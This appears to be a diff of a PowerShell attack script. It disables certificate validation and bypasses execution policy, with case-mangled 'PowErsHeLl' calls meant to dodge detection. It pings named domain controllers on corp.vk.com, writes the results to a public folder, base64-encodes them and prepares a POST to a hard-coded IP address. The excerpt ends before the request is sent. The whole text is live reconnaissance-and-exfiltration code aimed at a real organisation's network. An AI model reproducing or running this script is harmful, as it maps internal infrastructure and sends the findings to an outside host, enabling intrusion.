@@ -1,10 +1,10 @@
 [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};
 New-Item c:\users\public\music\file.txt;
-PowErsHeLl -ep Bypass "ping -n VK-DC03.corp.vk.com" > c:\users\public\music\file.txt;
-PowErsHeLl -ep Bypass "ping -n vk-dc01.corp.vk.com" >> c:\users\public\music\file.txt;
-PowErsHeLl -ep Bypass "ping -n km-vm-dc01.corp.vk.com" >> c:\users\public\music\file.txt;
-PowErsHeLl -ep Bypass "ping -n vk-dc04.corp.vk.com" >> c:\users\public\music\file.txt;
-PowErsHeLl -ep Bypass "ping -n km-vm-dc01.corp.vk.com" >> c:\users\public\music\file.txt;
+PowErsHeLl -ep Bypass "ping -n 1 VK-DC03.corp.vk.com" > c:\users\public\music\file.txt;
+PowErsHeLl -ep Bypass "ping -n 1 vk-dc01.corp.vk.com" >> c:\users\public\music\file.txt;
+PowErsHeLl -ep Bypass "ping -n 1 km-vm-dc01.corp.vk.com" >> c:\users\public\music\file.txt;
+PowErsHeLl -ep Bypass "ping -n 1 vk-dc04.corp.vk.com" >> c:\users\public\music\file.txt;
+PowErsHeLl -ep Bypass "ping -n 1 km-vm-dc01.corp.vk.com" >> c:\users\public\music\file.txt;
 $EncodedText = [convert]::ToBase64String((Get-Content -path c:\users\public\music\file.txt -Encoding byte));
 $verb = "POST";
 $addr = "https://46.161.53.115/micr0answer";
